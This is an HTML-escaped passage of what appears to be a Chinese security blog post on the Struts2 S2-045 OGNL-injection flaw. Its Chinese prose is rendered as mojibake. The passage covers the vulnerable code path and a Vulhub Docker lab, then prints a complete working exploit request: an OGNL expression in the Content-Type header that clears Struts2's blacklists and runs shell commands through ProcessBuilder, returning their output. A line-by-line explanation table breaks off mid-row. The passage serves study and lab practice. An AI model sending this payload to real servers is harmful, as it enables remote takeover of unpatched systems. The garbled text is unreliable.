&lt;h2 id=&#34;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34;&gt;&lt;a href=&#34;#æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&#34;&gt;&lt;/a&gt;æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ&lt;/h2&gt;&lt;h3 id=&#34;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34;&gt;&lt;a href=&#34;#OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34; class=&#34;headerlink&#34; title=&#34;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&#34;&gt;&lt;/a&gt;OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OGNLï¼ˆObject-Graph Navigation Languageï¼‰&lt;/strong&gt; æ˜¯Struts2æ¡†æ¶ä½¿ç”¨çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨Javaå¯¹è±¡ä¹‹é—´è¿›è¡Œå¯¼èˆªå’Œæ“ä½œã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// OGNLè¡¨è¾¾å¼ç¤ºä¾‹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-id&#34;&gt;#context&lt;/span&gt;&lt;span class=&#34;hljs-selector-attr&#34;&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;xwork.MethodAccessor.denyMethodExecution&amp;#x27;&lt;/span&gt;]&lt;/span&gt; = false&lt;br&gt;@java&lt;span class=&#34;hljs-selector-class&#34;&gt;.lang&lt;/span&gt;.Runtime@&lt;span class=&#34;hljs-built_in&#34;&gt;getRuntime&lt;/span&gt;()&lt;span class=&#34;hljs-selector-class&#34;&gt;.exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æ¼æ´è§¦å‘æµç¨‹&#34;&gt;&lt;a href=&#34;#æ¼æ´è§¦å‘æµç¨‹&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´è§¦å‘æµç¨‹&#34;&gt;&lt;/a&gt;æ¼æ´è§¦å‘æµç¨‹&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;è¯·æ±‚æ¥æ”¶&lt;/strong&gt;: æœåŠ¡å™¨æ¥æ”¶åŒ…å«æ¶æ„Content-Typeçš„HTTPè¯·æ±‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç±»å‹è§£æ&lt;/strong&gt;: Struts2å°è¯•è§£æContent-Typeå¤´éƒ¨ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å¼‚å¸¸è§¦å‘&lt;/strong&gt;: æ¶æ„æ„é€ çš„Content-Typeå¯¼è‡´è§£æå¼‚å¸¸&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é”™è¯¯å¤„ç†&lt;/strong&gt;: å¼‚å¸¸å¤„ç†å™¨å¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè§£æ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä»£ç æ‰§è¡Œ&lt;/strong&gt;: æ¶æ„OGNLè¡¨è¾¾å¼è¢«æ‰§è¡Œï¼Œå®ç°RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å…³é”®æºç åˆ†æ&#34;&gt;&lt;a href=&#34;#å…³é”®æºç åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;å…³é”®æºç åˆ†æ&#34;&gt;&lt;/a&gt;å…³é”®æºç åˆ†æ&lt;/h3&gt;&lt;p&gt;æ¼æ´ä½äº&lt;code&gt;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&lt;/code&gt;ç±»ä¸­ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç®€åŒ–çš„æ¼æ´ä»£ç é€»è¾‘&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;buildErrorMessage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-title class_&#34;&gt;Throwable&lt;/span&gt; e, &lt;span class=&#34;hljs-title class_&#34;&gt;Object&lt;/span&gt;[] args&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt; errorMessage = localizedTextProvider.&lt;span class=&#34;hljs-title function_&#34;&gt;findDefaultText&lt;/span&gt;(e.&lt;span class=&#34;hljs-title function_&#34;&gt;getMessage&lt;/span&gt;(), locale, args);&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// è¿™é‡Œä¼šå¯¹errorMessageè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œå¯¼è‡´RCE&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (errorMessage != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        errorMessage = &lt;span class=&#34;hljs-title class_&#34;&gt;TextParseUtil&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;translateVariables&lt;/span&gt;(errorMessage, stack);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;å®éªŒç¯å¢ƒæ­å»º&#34;&gt;&lt;a href=&#34;#å®éªŒç¯å¢ƒæ­å»º&#34; class=&#34;headerlink&#34; title=&#34;å®éªŒç¯å¢ƒæ­å»º&#34;&gt;&lt;/a&gt;å®éªŒç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;h3 id=&#34;ç³»ç»Ÿæ¶æ„&#34;&gt;&lt;a href=&#34;#ç³»ç»Ÿæ¶æ„&#34; class=&#34;headerlink&#34; title=&#34;ç³»ç»Ÿæ¶æ„&#34;&gt;&lt;/a&gt;ç³»ç»Ÿæ¶æ„&lt;/h3&gt;&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;â”Œâ”€ æ”»å‡»æœºï¼ˆHostï¼‰&lt;br&gt;â”‚  â””â”€ Windows&lt;span class=&#34;hljs-symbol&#34;&gt;/Linux&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; BurpSuite&lt;br&gt;â”‚&lt;br&gt;â””â”€ é¶æœºï¼ˆKali VMï¼‰&lt;br&gt;   â”œâ”€ &lt;span class=&#34;hljs-params&#34;&gt;IP:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;&lt;br&gt;   â”œâ”€ Docker &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; Vulhub&lt;br&gt;   â””â”€ Struts2 App (Port &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Dockerç¯å¢ƒéƒ¨ç½²&#34;&gt;&lt;a href=&#34;#Dockerç¯å¢ƒéƒ¨ç½²&#34; class=&#34;headerlink&#34; title=&#34;Dockerç¯å¢ƒéƒ¨ç½²&#34;&gt;&lt;/a&gt;Dockerç¯å¢ƒéƒ¨ç½²&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1. å…‹éš†Vulhubé¡¹ç›®&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 2. è¿›å…¥S2-045ç›®å½•&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/struts2/s2-045&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 3. å¯åŠ¨é¶åœº&lt;/span&gt;&lt;br&gt;docker-compose up -d&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 4. éªŒè¯å®¹å™¨çŠ¶æ€&lt;/span&gt;&lt;br&gt;docker ps -a&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;é¢„æœŸè¾“å‡º&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CONTAINER&lt;/span&gt; ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;2363a15cda30&lt;/span&gt;   vulhub/struts2:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mvn-server&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min ago   Up &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min     &lt;span class=&#34;hljs-number&#34;&gt;0.0.0.0:8080&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;/tcp  s2-&lt;span class=&#34;hljs-number&#34;&gt;045&lt;/span&gt;-struts2-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ç¯å¢ƒéªŒè¯&#34;&gt;&lt;a href=&#34;#ç¯å¢ƒéªŒè¯&#34; class=&#34;headerlink&#34; title=&#34;ç¯å¢ƒéªŒè¯&#34;&gt;&lt;/a&gt;ç¯å¢ƒéªŒè¯&lt;/h3&gt;&lt;p&gt;è®¿é—® &lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt; åº”è¯¥èƒ½çœ‹åˆ°Struts2é»˜è®¤é¡µé¢ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;a href=&#34;#æ¼æ´åˆ©ç”¨å®æˆ˜&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;/a&gt;æ¼æ´åˆ©ç”¨å®æˆ˜&lt;/h2&gt;&lt;h3 id=&#34;Payloadæ„é€ åŸç†&#34;&gt;&lt;a href=&#34;#Payloadæ„é€ åŸç†&#34; class=&#34;headerlink&#34; title=&#34;Payloadæ„é€ åŸç†&#34;&gt;&lt;/a&gt;Payloadæ„é€ åŸç†&lt;/h3&gt;&lt;p&gt;æ¶æ„Content-Typeçš„æ ¸å¿ƒç»“æ„ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content&lt;/span&gt;-Type: %&amp;#123;OGNL_EXPRESSION&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å®Œæ•´æ”»å‡»è½½è·&#34;&gt;&lt;a href=&#34;#å®Œæ•´æ”»å‡»è½½è·&#34; class=&#34;headerlink&#34; title=&#34;å®Œæ•´æ”»å‡»è½½è·&#34;&gt;&lt;/a&gt;å®Œæ•´æ”»å‡»è½½è·&lt;/h3&gt;&lt;figure class=&#34;highlight smalltalk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smalltalk&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;GET&lt;/span&gt; / &lt;span class=&#34;hljs-type&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;User&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Agent&lt;/span&gt;: &lt;span class=&#34;hljs-type&#34;&gt;Mozilla&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;5.0&lt;/span&gt; (compatible; &lt;span class=&#34;hljs-type&#34;&gt;MSIE&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;9.0&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6.1&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Win64&lt;/span&gt;; x64)&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Accept&lt;/span&gt;: text/html,application/xhtml+xml,application/xml;q=&lt;span class=&#34;hljs-number&#34;&gt;0.9&lt;/span&gt;,*/*;q=&lt;span class=&#34;hljs-number&#34;&gt;0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Type&lt;/span&gt;: %&amp;#123;&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#nike&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;multipart/form-data&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;=@ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlContext&lt;/span&gt;@&lt;span class=&#34;hljs-type&#34;&gt;DEFAULT_MEMBER_ACCESS&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;):(&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;&lt;/span&gt;]).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlUtil&lt;/span&gt;@class)).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;))&lt;br&gt;    )).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.&lt;span class=&#34;hljs-type&#34;&gt;System&lt;/span&gt;@getProperty(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;os.name&amp;#x27;&lt;/span&gt;).toLowerCase().contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;win&amp;#x27;&lt;/span&gt;))).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd.exe&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/bin/bash&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;=new java.lang.&lt;span class=&#34;hljs-type&#34;&gt;ProcessBuilder&lt;/span&gt;(&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.start()).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.&lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;@getResponse().getOutputStream())).&lt;br&gt;    (@org.apache.commons.io.&lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;@copy(&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;.flush())&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Length&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Payloadé€è¡Œè§£æ&#34;&gt;&lt;a href=&#34;#Payloadé€è¡Œè§£æ&#34; class=&#34;headerlink&#34; title=&#34;Payloadé€è¡Œè§£æ&#34;&gt;&lt;/a&gt;Payloadé€è¡Œè§£æ&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è¡¨è¾¾å¼ç‰‡æ®µ&lt;/th&gt;
&lt;th&gt;åŠŸèƒ½è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#nike=&amp;#39;multipart/form-data&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è®¾ç½®ä¼ªè£…çš„Content-Type&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è·å–é»˜è®¤æˆå‘˜è®¿é—®æƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#_memberAccess=#dm&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ç»•è¿‡Struts2çš„å®‰å…¨é™åˆ¶&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#container=#context[...]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è·å–ActionContextå®¹å™¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedPackageNames().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ¸…é™¤åŒ…åé»‘åå•&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedClasses().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ¸…é™¤ç±»åé»‘åå•&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmd=&amp;#39;whoami&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#iswin=...contains(&amp;#39;win&amp;#39;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmds=(#iswin?&amp;#123;...&amp;#125;:&amp;#123;...&amp;#125;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ ¹æ®ç³»ç»Ÿç±»å‹æ„é€ å‘½ä»¤å‚æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#p=new ProcessBuilder(#cmds)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åˆ›å»ºè¿›ç¨‹æ„å»ºå™¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#process=#p.start()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å¯åŠ¨è¿›ç¨‹æ‰§è¡Œå‘½ä»¤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;IOUtils@copy(...)&lt;/code&gt;&lt;/td&gt;
